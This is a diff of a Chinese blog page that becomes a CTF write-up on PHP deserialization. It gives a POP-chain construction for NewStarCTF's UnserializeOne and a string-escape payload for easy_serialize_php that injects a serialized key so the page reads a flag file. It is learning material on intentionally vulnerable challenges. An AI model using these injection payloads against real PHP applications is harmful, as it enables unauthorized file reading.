@@ -6,7 +6,7 @@
     <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">    
 <meta name="viewport" content="width=device-width,minimum-scale=1">
-<meta name="description" content="序言 🔗">
+<meta name="description" content="">
 <meta name="generator" content="Hugo 0.128.2">
 
 
@@ -81,13 +81,13 @@
           ·
         </span>
         <span>
-          3 words
+          1312 words
         </span>
         <span class="split">
           ·
         </span>
         <span>
-          1 minute read
+          3 minute read
         </span>
     </div>
 
@@ -101,7 +101,212 @@
 
 
     <div class="content">
-      <h1 id="序言">序言 <a href="#%e5%ba%8f%e8%a8%80" class="anchor">🔗</a></h1>
+      <p><strong>魔术方法</strong></p>
+<p>__construct() //当一个对象创建时被调用</p>
+<p>__destruct() //当一个对象销毁时被调用</p>
+<p>__toString() //当一个对象被当作一个字符串使用</p>
+<p>__sleep()//在对象在被序列化之前运行</p>
+<p>__wakeup() //将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</p>
+<p>__get() //获得一个类的成员变量时调用</p>
+<p>__set() //在尝试给对象的不可访问（如私有或未定义）属性赋值时被自动调用</p>
+<p>__invoke() //调用函数的方式调用一个对象时的回应方法</p>
+<p>__call() //当调用一个对象中的不能用的方法的时候就会执行这个函数</p>
+<p><strong>反序列化漏洞条件</strong>：</p>
+<ol>
+<li>
+<p>代码中有可利用的类，类中有可用的魔术方法</p>
+</li>
+<li>
+<p>unserialize()函数的参数可控</p>
+</li>
+</ol>
+<p><strong>POP链构造</strong></p>
+<p><strong>[NewStarCTF 公开赛赛道]UnserializeOne
+42</strong></p>
+<p>题目源码:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
+</span></span><span style="display:flex;"><span>error_reporting(<span style="color:#666">0</span>);
+</span></span><span style="display:flex;"><span>highlight_file(<span style="color:#800">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Start</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$name</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">protected</span> <span style="color:#b8860b">$func</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __destruct()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">echo</span> <span style="color:#b44">&#34;Welcome to NewStarCTF, &#34;</span><span style="color:#666">.</span><span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">name</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __isset(<span style="color:#b8860b">$var</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        (<span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">func</span>)();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Sec</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">private</span> <span style="color:#b8860b">$obj</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">private</span> <span style="color:#b8860b">$var</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __toString()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">obj</span><span style="color:#666">-&gt;</span><span style="color:#b44">check</span>(<span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">var</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#b44">&#34;CTFers&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __invoke()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">echo</span> file_get_contents(<span style="color:#b44">&#39;/flag&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Easy</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$cla</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __call(<span style="color:#b8860b">$fun</span>, <span style="color:#b8860b">$var</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">cla</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">clone</span> <span style="color:#b8860b">$var</span>[<span style="color:#666">0</span>];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">eeee</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$obj</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __clone()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(isset(<span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">obj</span><span style="color:#666">-&gt;</span><span style="color:#b44">cmd</span>)){
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">echo</span> <span style="color:#b44">&#34;success&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>构造pop链：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Start</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$name</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$func</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Sec</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$obj</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$var</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Easy</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$cla</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">eeee</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$obj</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$a</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> Start();
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$b</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> Sec();
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$c</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> Easy();
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$d</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> eeee();
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$e</span> <span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> Start();
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$f</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> Sec();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$a</span><span style="color:#666">-&gt;</span><span style="color:#b44">name</span><span style="color:#666">=</span><span style="color:#b8860b">$b</span>;
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$b</span><span style="color:#666">-&gt;</span><span style="color:#b44">obj</span><span style="color:#666">=</span><span style="color:#b8860b">$c</span>;
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$b</span><span style="color:#666">-&gt;</span><span style="color:#b44">var</span><span style="color:#666">=</span> <span style="color:#b8860b">$d</span>;
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$d</span><span style="color:#666">-&gt;</span><span style="color:#b44">obj</span><span style="color:#666">=</span> <span style="color:#b8860b">$e</span>;
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$e</span><span style="color:#666">-&gt;</span><span style="color:#b44">func</span><span style="color:#666">=</span><span style="color:#b8860b">$f</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">echo</span> serialize(<span style="color:#b8860b">$a</span>);
+</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
+</span></span></span></code></pre></div><p>post参数就可以看到flag啦~~</p>
+<p><p class="markdown-image">
+  <img src="/img/26.png" alt="alt text"  />
+</p></p>
+<p><strong>字符串逃逸</strong></p>
+<p><strong>[安洵杯 2019]easy_serialize_php
+1</strong></p>
+<p>题目源码：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$function</span> <span style="color:#666">=</span> <span style="color:#666">@</span><span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;f&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">function</span> <span style="color:#00a000">filter</span>(<span style="color:#b8860b">$img</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$filter_arr</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">array</span>(<span style="color:#b44">&#39;php&#39;</span>,<span style="color:#b44">&#39;flag&#39;</span>,<span style="color:#b44">&#39;php5&#39;</span>,<span style="color:#b44">&#39;php4&#39;</span>,<span style="color:#b44">&#39;fl1g&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$filter</span> <span style="color:#666">=</span> <span style="color:#b44">&#39;/&#39;</span><span style="color:#666">.</span>implode(<span style="color:#b44">&#39;|&#39;</span>,<span style="color:#b8860b">$filter_arr</span>)<span style="color:#666">.</span><span style="color:#b44">&#39;/i&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">return</span> preg_replace(<span style="color:#b8860b">$filter</span>,<span style="color:#b44">&#39;&#39;</span>,<span style="color:#b8860b">$img</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#b8860b">$_SESSION</span>){
+</span></span><span style="display:flex;"><span>    unset(<span style="color:#b8860b">$_SESSION</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#34;user&#34;</span>] <span style="color:#666">=</span> <span style="color:#b44">&#39;guest&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;function&#39;</span>] <span style="color:#666">=</span> <span style="color:#b8860b">$function</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>extract(<span style="color:#b8860b">$_POST</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#666">!</span><span style="color:#b8860b">$function</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">echo</span> <span style="color:#b44">&#39;&lt;a href=&#34;index.php?f=highlight_file&#34;&gt;source_code&lt;/a&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#666">!</span><span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;img_path&#39;</span>]){
+</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;img&#39;</span>] <span style="color:#666">=</span> base64_encode(<span style="color:#b44">&#39;guest_img.png&#39;</span>);
+</span></span><span style="display:flex;"><span>}<span style="color:#a2f;font-weight:bold">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;img&#39;</span>] <span style="color:#666">=</span> sha1(base64_encode(<span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;img_path&#39;</span>]));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$serialize_info</span> <span style="color:#666">=</span> filter(serialize(<span style="color:#b8860b">$_SESSION</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#b8860b">$function</span> <span style="color:#666">==</span> <span style="color:#b44">&#39;highlight_file&#39;</span>){
+</span></span><span style="display:flex;"><span>    highlight_file(<span style="color:#b44">&#39;index.php&#39;</span>);
+</span></span><span style="display:flex;"><span>}<span style="color:#a2f;font-weight:bold">else</span> <span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#b8860b">$function</span> <span style="color:#666">==</span> <span style="color:#b44">&#39;phpinfo&#39;</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">eval</span>(<span style="color:#b44">&#39;phpinfo();&#39;</span>); <span style="color:#080;font-style:italic">//maybe you can find something in here!
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>}<span style="color:#a2f;font-weight:bold">else</span> <span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#b8860b">$function</span> <span style="color:#666">==</span> <span style="color:#b44">&#39;show_image&#39;</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$userinfo</span> <span style="color:#666">=</span> unserialize(<span style="color:#b8860b">$serialize_info</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">echo</span> file_get_contents(base64_decode(<span style="color:#b8860b">$userinfo</span>[<span style="color:#b44">&#39;img&#39;</span>]));
+</span></span><span style="display:flex;"><span>} 
+</span></span></code></pre></div><p>根据提示传?f=phpinfo可以看到d0g3_f1ag.php</p>
+<p><p class="markdown-image">
+  <img src="/img/22.png" alt="alt text"  />
+</p></p>
+<p>要想看到该文件，需要分析源码</p>
+<p>要求$userinfo[&lsquo;img&rsquo;]这个变量是个文件，才能利用file_get_contents查看，这个变量是serialize_info反序列化来的，serialize_info又是_SESSION序列化在经过filter函数得来的。又因为$userinfo[&lsquo;img&rsquo;]有img这个键值，<strong>那么_SESSION这个变量里也要有img这个键值。</strong></p>
+<p>先看看需要用到的_SESSION值</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#34;user&#34;</span>] <span style="color:#666">=</span> <span style="color:#b44">&#39;guest&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;function&#39;</span>] <span style="color:#666">=</span> <span style="color:#b44">&#39;a&#39;</span>;<span style="color:#080;font-style:italic">//对function赋个值
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span><span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;img&#39;</span>] <span style="color:#666">=</span> <span style="color:#b44">&#39;ZDBnM19mMWFnLnBocA==&#39;</span>;<span style="color:#080;font-style:italic">//对d0g3_f1ag.php进行编码
+</span></span></span></code></pre></div><p>序列化后为</p>
+<blockquote>
+<p>&ldquo;a:3:{s:4:&ldquo;user&rdquo;;s:5:&ldquo;guest&rdquo;；s:8:&ldquo;function&rdquo;;s:1:&ldquo;a&rdquo;;s:3:&ldquo;img&rdquo;;s:20:&ldquo;ZDBnM19mMWFnLnBocA==&rdquo;;}&rdquo;</p>
+</blockquote>
+<p>利用filter让字符串逃逸使得__SESSION包含img的键值</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#34;user&#34;</span>] <span style="color:#666">=</span> <span style="color:#b44">&#39;flagflagflagflagflagflag&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;function&#39;</span>] <span style="color:#666">=</span> <span style="color:#b44">&#39;a&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;s:2:&#34;dd&#34;;s:1:&#34;a&#34;;}&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;img&#39;</span>] <span style="color:#666">=</span> <span style="color:#b44">&#39;ZDBnM19mMWFnLnBocA==&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">function</span> <span style="color:#00a000">filter</span>(<span style="color:#b8860b">$img</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$filter_arr</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">array</span>(<span style="color:#b44">&#39;php&#39;</span>,<span style="color:#b44">&#39;flag&#39;</span>,<span style="color:#b44">&#39;php5&#39;</span>,<span style="color:#b44">&#39;php4&#39;</span>,<span style="color:#b44">&#39;fl1g&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$filter</span> <span style="color:#666">=</span> <span style="color:#b44">&#39;/&#39;</span><span style="color:#666">.</span>implode(<span style="color:#b44">&#39;|&#39;</span>,<span style="color:#b8860b">$filter_arr</span>)<span style="color:#666">.</span><span style="color:#b44">&#39;/i&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">return</span> preg_replace(<span style="color:#b8860b">$filter</span>,<span style="color:#b44">&#39;&#39;</span>,<span style="color:#b8860b">$img</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$_SESSION</span><span style="color:#666">=</span>filter(serialize(<span style="color:#b8860b">$_SESSION</span>));
+</span></span><span style="display:flex;"><span>var_dump(serialize(<span style="color:#b8860b">$_SESSION</span>));
+</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
+</span></span></span></code></pre></div><p>得到</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>string(154) &#34;s:145:&#34;a:3:{s:4:&#34;user&#34;;s:24:&#34;&#34;;s:8:&#34;function&#34;;s:59:&#34;a&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;s:2:&#34;dd&#34;;s:1:&#34;a&#34;;}&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;}&#34;;&#34;
+</span></span></code></pre></div><p>过滤机制使user值变为<code>&quot;;s:8:&quot;function&quot;;s:59:&quot;a</code>,img替代function成为第二个参数，后面手动添加一个<code>dd</code>成为第三个参数就可以啦，后面的img成功逃逸！</p>
+<p>payload:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;s:2:&#34;dd&#34;;s:1:&#34;a&#34;;}
+</span></span></code></pre></div><p>查看页面源代码发现/d0g3_fllllllag</p>
+<p><p class="markdown-image">
+  <img src="/img/23.png" alt="alt text"  />
+</p></p>
+<p>将/d0g3_fllllllag编码后替换原先d0g3_f1ag.php
+的码值即可</p>
+<p><p class="markdown-image">
+  <img src="/img/25.png" alt="alt text"  />
+</p></p>
+<p>成功得到flag:</p>
+<p><p class="markdown-image">
+  <img src="/img/24.png" alt="alt text"  />
+</p></p>
     </div>
 
     
